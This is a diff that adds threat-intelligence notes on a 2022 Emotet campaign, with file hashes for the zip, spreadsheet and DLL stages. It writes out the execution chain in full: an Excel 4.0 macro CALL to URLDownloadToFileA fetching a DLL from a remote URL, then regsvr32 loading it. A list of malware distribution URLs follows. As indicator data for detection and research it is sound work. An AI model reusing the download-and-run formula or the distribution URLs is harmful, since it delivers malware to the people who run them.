@@ -1,4 +1,33 @@
-Emotet 2022 | epoch5 | 01.04.2022 | 
+Emotet 2022 | epoch5 | 01.04.2022 
+
+************************************************************************************************************
+
+.zip 421A7451C0F5B15B4CCD128713DE7CE0D0B6CB8CD26878DAE24A1F1E2B50F1C5
+.xls 2b8d399bcd8fa64dfa792d108117b503f13a1d16c9344c1efe5a2cd7acd8b968
+.dll 9b50853bf832d5df449a33bbe3ef5a04250326be3ed8fca7b188420dae6fe4dc
+
+************************************************************************************************************
+
+Exec >>
+
+EXCEL.EXE C:\Users\Admin\AppData\Local\Temp\Mensaje_7107855905.xls
+
+=CALL("urlmon", "URLDownloadToFileA", "JCCB", 0, "https://bvirtual.com/affinita/ryXUZdAHcNNEG/", "..\xcah.dll")
+
+C:\Windows\SysWow64\regsvr32.exe -s ..\xcah.dll
+
+C:\Windows\SysWOW64\regsvr32.exe /s "C:\Windows\SysWOW64\Ilmaogsy\kwqucpcvpv.txz
+
+************************************************************************************************************
+
+.dll distro
+
+https://bvirtual.com/affinita/ryXUZdAHcNNEG/
+https://www.almoeqatar.com/cgi-bin/qoOYPhlkRGnBClmNu5I/
+http://mulmatdol.com/adm/Semrx6pQ/
+https://bulldogironworksllc.com/temp/32930RoofbdmQ0r/
+https://bosny.com/aspnet_client/UZlstV/
+http://escgayrimenkul.com/cgi-bin/RuqpDmm/
 
 ************************************************************************************************************
 
